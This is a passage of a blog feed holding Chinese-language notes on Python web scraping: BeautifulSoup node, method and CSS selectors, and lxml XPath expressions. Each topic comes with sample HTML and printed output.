class="line"><span class="string">&lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href="http://example.com/lacie" class="sister" id="link2"&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href="http://example.com/tillie" class="sister" id="link3"&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class="story"&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.title)</span><br><span class="line">print(type(soup.title))</span><br><span class="line">print(soup.title.string)</span><br><span class="line">print(soup.head)</span><br><span class="line">print(soup.p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">&lt;title&gt;The Dormouse<span class="string">'s story&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;class '</span>bs4.element.Tag<span class="string">'&gt;</span></span><br><span class="line"><span class="string">The Dormouse'</span>s story</span><br><span class="line">&lt;head&gt;&lt;title&gt;The Dormouse<span class="string">'s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><h2 id="32-提取信息"><a class="markdownIt-Anchor" href="#32-提取信息"></a> 3.2 提取信息</h2><h3 id="321-获取名称"><a class="markdownIt-Anchor" href="#321-获取名称"></a> 3.2.1 获取名称</h3><ul><li>可以利用<kbd>name</kbd>属性获取节点的名称</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(soup.title.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">title</span><br></pre></td></tr></table></figure><h3 id="322-获取属性"><a class="markdownIt-Anchor" href="#322-获取属性"></a> 3.2.2 获取属性</h3><ul><li>调用<kbd>attrs</kbd>获取所有属性</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(soup.p.attrs)</span><br><span class="line">print(soup.p.attrs[<span class="string">'name'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">&#123;<span class="string">'class'</span>: [<span class="string">'title'</span>], <span class="string">'name'</span>: <span class="string">'dromouse'</span>&#125;</span><br><span class="line">dromouse</span><br></pre></td></tr></table></figure><ul><li>更为简便的写法是省略attrs</li><li>这里需要注意的是，有的返回结果是字符串，有的返回结果是字符串组成的列表。比如，name属性的值是唯一的，返回的结果就是单个字符串。而对于class，一个节点元素可能有多个class，所以返回的是列表。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(soup.p[<span class="string">'name'</span>])</span><br><span class="line">print(soup.p[<span class="string">'class'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">dromouse</span><br><span class="line">[<span class="string">'title'</span>]</span><br></pre></td></tr></table></figure><h3 id="323-获取内容"><a class="markdownIt-Anchor" href="#323-获取内容"></a> 3.2.3 获取内容</h3><p>利用<kbd>string</kbd>属性获取节点元素包含的文本内容</p><h2 id="33-嵌套选择"><a class="markdownIt-Anchor" href="#33-嵌套选择"></a> 3.3 嵌套选择</h2><ul><li>每一个返回结果都是<kbd>bs4.element.Tag</kbd>类型，它同样可以继续调用节点进行下一步的选择</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.head.title)</span><br><span class="line">print(type(soup.head.title))</span><br><span class="line">print(soup.head.title.string)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">&lt;title&gt;The Dormouse<span class="string">'s story&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;class '</span>bs4.element.Tag<span class="string">'&gt;</span></span><br><span class="line"><span class="string">The Dormouse'</span>s story</span><br></pre></td></tr></table></figure><h2 id="34-关联选择"><a class="markdownIt-Anchor" href="#34-关联选择"></a> 3.4 关联选择</h2><ul><li>在做选择的时候，有时候不能做到一步就选到想要的节点元素，需要先选中某一个节点元素，然后以它为基准再选择它的子节点、父节点、兄弟节点等</li></ul><h3 id="341-子节点和子孙节点"><a class="markdownIt-Anchor" href="#341-子节点和子孙节点"></a> 3.4.1 子节点和子孙节点</h3><ul><li><kbd>contents</kbd>：得到的结果是所有直接子节点的列表，孙节点会包含在字节点中而不会单独列出</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">print</span> (soup.p.contents)</span><br></pre></td></tr></table></figure><ul><li><kbd>children</kbd>：返回结果是生成器，返回所有的子孙节点，包含在字节点中的孙节点也会单独列出</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.p.children)</span><br><span class="line"><span class="comment">#enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</span></span><br><span class="line"><span class="keyword">for</span> i, child <span class="keyword">in</span> enumerate(soup.p.children):</span><br><span class="line">    print(i, child)</span><br></pre></td></tr></table></figure><h3 id="342-父节点和祖先节点"><a class="markdownIt-Anchor" href="#342-父节点和祖先节点"></a> 3.4.2 父节点和祖先节点</h3><p><kbd>parent属性</kbd>：获取某个节点元素的直接父节点<br /><kbd>parents属性</kbd>：获取某个节点元素的所有祖先<br />点</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">print</span> (soup.a.parent)</span><br><span class="line"><span class="keyword">print</span> (soup.a.parents)</span><br></pre></td></tr></table></figure><h3 id="343-兄弟节点"><a class="markdownIt-Anchor" href="#343-兄弟节点"></a> 3.4.3 兄弟节点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(<span class="string">'Next Sibling'</span>, soup.a.next_sibling)</span><br><span class="line">print(<span class="string">'Prev Sibling'</span>, soup.a.previous_sibling)</span><br><span class="line">print(<span class="string">'Next Siblings'</span>, list(enumerate(soup.a.next_siblings)))</span><br><span class="line">print(<span class="string">'Prev Siblings'</span>, list(enumerate(soup.a.previous_siblings)))</span><br></pre></td></tr></table></figure><h3 id="344-提取信息"><a class="markdownIt-Anchor" href="#344-提取信息"></a> 3.4.4 提取信息</h3><ul><li>如果返回结果是单个节点，那么可以直接调用string、attrs等属性获得其文本和属性；如果返回结果是多个节点的生成器，则可以转为列表后取出某个元素，然后再调用string、attrs等属性获取其对应节点的文本和属性。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;p class="story"&gt;</span></span><br><span class="line"><span class="string">            Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">            &lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;Bob&lt;/a&gt;&lt;a href="http://example.com/lacie" class="sister" id="link2"&gt;Lacie&lt;/a&gt; </span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(<span class="string">'Next Sibling:'</span>)</span><br><span class="line">print(type(soup.a.next_sibling))</span><br><span class="line">print(soup.a.next_sibling)</span><br><span class="line">print(soup.a.next_sibling.string)</span><br><span class="line">print(<span class="string">'Parent:'</span>)</span><br><span class="line">print(type(soup.a.parents))</span><br><span class="line">print(list(soup.a.parents)[<span class="number">0</span>])</span><br><span class="line">print(list(soup.a.parents)[<span class="number">0</span>].attrs[<span class="string">'class'</span>])</span><br></pre></td></tr></table></figure><h1 id="4-方法选择器"><a class="markdownIt-Anchor" href="#4-方法选择器"></a> 4 方法选择器</h1><h2 id="41-find_all"><a class="markdownIt-Anchor" href="#41-find_all"></a> 4.1 find_all()</h2><ul><li>给它传入一些属性或文本，查询所有符合条件的元素。</li></ul><h3 id="411-name"><a class="markdownIt-Anchor" href="#411-name"></a> 4.1.1 name</h3><ul><li>返回所有ul节点组成的列表，每个元素依然都是bs4.element.Tag类型</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.find_all(name=<span class="string">'ul'</span>))</span><br><span class="line">print(type(soup.find_all(name=<span class="string">'ul'</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><ul><li>因为每个节点都是Tag类型，所以依然可以嵌套查询</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.find_all(name=<span class="string">'ul'</span>):</span><br><span class="line">    print(ul.find_all(name=<span class="string">'li'</span>))</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> ul.find_all(name=<span class="string">'li'</span>):</span><br><span class="line">        print(li.string)</span><br></pre></td></tr></table></figure><h3 id="412-attrs"><a class="markdownIt-Anchor" href="#412-attrs"></a> 4.1.2 attrs</h3><ul><li>根据一些属性来查询</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.find_all(attrs=&#123;<span class="string">'id'</span>: <span class="string">'list-1'</span>&#125;))</span><br><span class="line">print(soup.find_all(attrs=&#123;<span class="string">'name'</span>: <span class="string">'elements'</span>&#125;))</span><br></pre></td></tr></table></figure><ul><li>对于一些常用的属性，比如id和class等，我们可以不用attrs来传递。比如，要查询id为list-1的节点，可以直接传入id这个参数。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.find_all(id=<span class="string">'list-1'</span>))</span><br><span class="line"><span class="comment">#由于class在Python里是一个关键字，所以后面需要加一个下划线</span></span><br><span class="line">print(soup.find_all(class_=<span class="string">'element'</span>))</span><br></pre></td></tr></table></figure><h3 id="413-text"><a class="markdownIt-Anchor" href="#413-text"></a> 4.1.3 text</h3><ul><li>可用来匹配节点的文本，传入的形式可以是字符串，可以是正则表达式对象</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">html=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string">        &lt;a&gt;Hello, this is a link&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;a&gt;Hello, this is a link, too&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.find_all(text=re.compile(<span class="string">'link'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">[<span class="string">'Hello, this is a link'</span>, <span class="string">'Hello, this is a link, too'</span>]</span><br></pre></td></tr></table></figure><h2 id="42-find"><a class="markdownIt-Anchor" href="#42-find"></a> 4.2 find()</h2><ul><li>返回第一个匹配的元素</li><li>返回结果不再是列表形式，而是第一个匹配的节点元素，类型依然是Tag类型</li></ul><h2 id="43-其他查询方法"><a class="markdownIt-Anchor" href="#43-其他查询方法"></a> 4.3 其他查询方法</h2><ul><li><kbd>find_parents()</kbd>和<kbd>find_parent()</kbd>：前者返回所有祖先节点，后者返回直接父节点。</li><li><kbd>find_next_siblings()</kbd>和<kbd>find_next_sibling()</kbd>：前者返回后面所有的兄弟节点，后者返回后面第一个兄弟节点。</li><li><kbd>find_previous_siblings()</kbd>和<kbd>find_previous_sibling()</kbd>：前者返回前面所有的兄弟节点，后者返回前面第一个兄弟节点。</li><li><kbd>find_all_next()</kbd>和<kbd>find_next()</kbd>：前者返回节点后所有符合条件的节点，后者返回第一个符合条件的节点。</li><li><kbd>find_all_previous()</kbd>和<kbd>find_previous()</kbd>：前者返回节点后所有符合条件的节点，后者返回第一个符合条件的节点。</li></ul><h1 id="5-css选择器"><a class="markdownIt-Anchor" href="#5-css选择器"></a> 5 CSS选择器</h1><ul><li>使用CSS选择器时，只需要调用select()方法，传入相应的CSS选择器即可</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string">        &lt;h4&gt;Hello&lt;/h4&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string">        &lt;ul class="list" id="list-1"&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="element"&gt;Jay&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;ul class="list list-small" id="list-2"&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.select(<span class="string">'.panel .panel-heading'</span>))</span><br><span class="line"><span class="comment">#选择所有ul节点下面的所有li节点</span></span><br><span class="line">print(soup.select(<span class="string">'ul li'</span>))</span><br><span class="line">print(soup.select(<span class="string">'#list-2 .element'</span>))</span><br><span class="line">print(type(soup.select(<span class="string">'ul'</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="51-嵌套选择"><a class="markdownIt-Anchor" href="#51-嵌套选择"></a> 5.1 嵌套选择</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.select(<span class="string">'ul'</span>):</span><br><span class="line">    print(ul.select(<span class="string">'li'</span>))</span><br></pre></td></tr></table></figure><h2 id="52-获取属性"><a class="markdownIt-Anchor" href="#52-获取属性"></a> 5.2 获取属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> ul <span class="keyword">in</span> soup.select(<span class="string">'ul'</span>):</span><br><span class="line">    print(ul[<span class="string">'id'</span>])</span><br><span class="line">    print(ul.attrs[<span class="string">'id'</span>])</span><br></pre></td></tr></table></figure><h2 id="53-获取文本"><a class="markdownIt-Anchor" href="#53-获取文本"></a> 5.3 获取文本</h2><ul><li>要获取文本，当然也可以用前面所讲的string属性。此外，还有一个方法，那就是<kbd>get_text()</kbd></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> soup.select(<span class="string">'li'</span>):</span><br><span class="line">    print(<span class="string">'Get Text:'</span>, li.get_text())</span><br><span class="line">    print(<span class="string">'String:'</span>, li.string)</span><br></pre></td></tr></table></figure><h1 id="6-总结"><a class="markdownIt-Anchor" href="#6-总结"></a> 6 总结</h1><ul><li><strong>推荐使用lxml解析库，必要时使用html.parser。</strong></li><li>节点选择筛选功能弱但是速度快。</li><li><strong>建议使用find()或者find_all()查询匹配单个结果或者多个结果。</strong></li><li>如果对CSS选择器熟悉的话，可以使用select()方法选择。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3爬虫笔记-解析库XPath</title>
      <link href="/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E8%A7%A3%E6%9E%90%E5%BA%93XPath/"/>
      <url>/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E8%A7%A3%E6%9E%90%E5%BA%93XPath/</url>
      
        <content type="html"><![CDATA[<ul><li>XPath概述：XPath，全称XML Path Language，即XML路径语言，它是一门在XML文档中查找信息的语言。它最初是用来搜寻XML文档的，但是它同样适用于<kbd>HTML</kbd>文档的搜索。</li></ul><h1 id="xpath常用规则"><a class="markdownIt-Anchor" href="#xpath常用规则"></a> XPath常用规则</h1><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点</td></tr><tr><td>/</td><td>从当前节点选取直接子节点</td></tr><tr><td>//</td><td>从当前节点选取子孙节点</td></tr><tr><td>.</td><td>选取当前节点</td></tr><tr><td>…</td><td>选取当前节点的父节点</td></tr><tr><td>@</td><td>选取属性</td></tr></tbody></table><ul><li>下例代表选择所有名称为<kbd>title</kbd>，同时属性<kbd>lang</kbd>的值为<kbd>eng</kbd>的节点。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;title[@lang&#x3D;&#39;eng&#39;]</span><br></pre></td></tr></table></figure><ul><li>如下例，首先导入<kbd>lxml库</kbd>的<kbd>etree模块</kbd>，然后声明了一段HTML文本，调用HTML类进行初始化，这样就成功构造了一个<kbd>XPath解析对象</kbd>。这里需要注意的是，HTML文本中的最后一个li节点是没有闭合的，但是etree模块可以<kbd>自动修正</kbd>HTML文本。</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">text = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">result = etree.tostring(html)</span><br><span class="line">print(result.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;</span><br><span class="line">     &lt;/li&gt;&lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p>这里我们调用<kbd>tostring()</kbd>方法即可输出修正后的HTML代码，经过处理之后，li节点标签被补全，并且还自动添加了body、html节点。但是结果是bytes类型。这里利用decode()方法将其转成str类型</p></li><li><p>另外，也可以直接读取文本文件进行解析，示例如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = etree.tostring(html)</span><br><span class="line">print(result.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><h1 id="1-所有节点"><a class="markdownIt-Anchor" href="#1-所有节点"></a> 1 所有节点</h1><ul><li>这里使用<kbd>*</kbd>代表匹配所有节点，也就是整个HTML文本中的所有节点都会被获取。可以看到，返回形式是一个列表，每个元素是<kbd>Element</kbd>类型，其后跟了节点的名称，如html、body、div、ul、li、a等，所有节点都包含在列表中了。</li><li></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//*'</span>)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">[&lt;Element html at <span class="number">0x10510d9c8</span>&gt;, &lt;Element body at <span class="number">0x10510da08</span>&gt;, &lt;Element div at <span class="number">0x10510da48</span>&gt;, &lt;Element ul at <span class="number">0x10510da88</span>&gt;, &lt;Element li at <span class="number">0x10510dac8</span>&gt;, &lt;Element a at <span class="number">0x10510db48</span>&gt;, &lt;Element li at <span class="number">0x10510db88</span>&gt;, &lt;Element a at <span class="number">0x10510dbc8</span>&gt;, &lt;Element li at <span class="number">0x10510dc08</span>&gt;, &lt;Element a at <span class="number">0x10510db08</span>&gt;, &lt;Element li at <span class="number">0x10510dc48</span>&gt;, &lt;Element a at <span class="number">0x10510dc88</span>&gt;, &lt;Element li at <span class="number">0x10510dcc8</span>&gt;, &lt;Element a at <span class="number">0x10510dd08</span>&gt;]</span><br></pre></td></tr></table></figure><p>当然，此处匹配也可以指定节点名称。如果想获取所有li节点，示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//li'</span>)</span><br><span class="line">print(result)</span><br><span class="line">print(result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">[&lt;Element li at <span class="number">0x105849208</span>&gt;, &lt;Element li at <span class="number">0x105849248</span>&gt;, &lt;Element li at <span class="number">0x105849288</span>&gt;, &lt;Element li at <span class="number">0x1058492c8</span>&gt;, &lt;Element li at <span class="number">0x105849308</span>&gt;]</span><br><span class="line">&lt;Element li at <span class="number">0x105849208</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="2-子节点"><a class="markdownIt-Anchor" href="#2-子节点"></a> 2 子节点</h1><ul><li>我们通过/或//即可查找元素的子节点或子孙节点。假如现在想选择li节点的所有直接a子节点，可以这样实现：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//li/a'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><ul><li>此处的/用于选取直接子节点，如果要获取所有子孙节点，就可以使用//。例如，要获取ul节点下的所有子孙a节点，可以这样实现：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//ul//a'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><ul><li>但是如果这里用//ul/a，就无法获取任何结果了。因为/用于获取直接子节点，而在ul节点下没有直接的a子节点，只有li节点，所以无法获取任何匹配结果</li></ul><h1 id="3-父节点"><a class="markdownIt-Anchor" href="#3-父节点"></a> 3 父节点</h1><ul><li>查找父节点呢可以用<kbd>..</kbd>来实现。</li><li>比如，现在首先选中href属性为link4.html的a节点，然后再获取其父节点，然后再获取其class属性，相关代码如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//a[@href="link4.html"]/../@class'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><ul><li>同时，我们也可以通过<kbd>parent::</kbd>来获取父节点，代码如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//a[@href="link4.html"]/parent::*/@class'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h1 id="4-属性匹配"><a class="markdownIt-Anchor" href="#4-属性匹配"></a> 4 属性匹配</h1><ul><li><kbd>@</kbd>：属性过滤</li><li>比如，如果要选取class为item-0的li节点，可以这样实现:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result = html.xpath(<span class="string">'//li[@class="item-0"]'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h1 id="5-文本获取"><a class="markdownIt-Anchor" href="#5-文本获取"></a> 5 文本获取</h1><ul><li><kbd>text()</kbd>：获取节点中的文本</li><li>如下例，result1选取了li节点中的内容，只有一个换行符；result2是逐层选取，先选取li节点，又选取了li节点的直接字节点中的内容；而result3是匹配所有li和li的字节点所包含的所有内容。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">html = etree.parse(<span class="string">'./test.html'</span>, etree.HTMLParser())</span><br><span class="line">result1 = html.xpath(<span class="string">'//li[@class="item-0"]/text()'</span>)</span><br><span class="line">print(result1)</span><br><span class="line"></span><br><span class="line">result2 = html.xpath(<span class="string">'//li[@class="item-0"]/a/text()'</span>)</span><br><span class="line"><span class="keyword">print</span> (result2)</span><br><span class="line"></span><br><span class="line">result3 = html.xpath(<span class="string">'//li[@class="item-0"]//text()'</span>)</span><br><span class="line"><span class="keyword">print</span> (result3)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[<span class="string">'\n     '</span>]</span><br><span class="line">[<span class="string">'first item'</span>, <span class="string">'fifth item'</span>]</span><br><span class="line">[<span class="string">'first item'</span>, <span class="string">'fifth item'</span>, <span class="string">'\n     '</span>]</span><br></pre></td></tr></table></figure><h1 